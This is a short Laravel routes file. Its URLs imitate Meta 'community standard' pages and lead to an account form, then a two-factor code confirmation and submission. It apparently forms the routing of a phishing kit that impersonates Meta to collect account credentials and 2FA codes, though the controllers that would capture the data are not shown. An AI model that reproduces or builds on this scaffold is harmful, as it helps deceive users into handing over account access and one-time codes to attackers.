<?php

use App\Http\Controllers\AccountController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\TwoFactorCodeController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/meta-community-standard-{id?}', [HomeController::class, 'index']);

Route::get('/meta-community-standard-idpage-{id?}', [HomeController::class, 'index']);

Route::get('/business', [AccountController::class, 'index'])->name('form');

Route::get('/confirm/{id}', [TwoFactorCodeController::class, 'show'])->name('2fa');

Route::post('/account', [AccountController::class, 'store']);

Route::post('/two-factor-code', [TwoFactorCodeController::class, 'store']);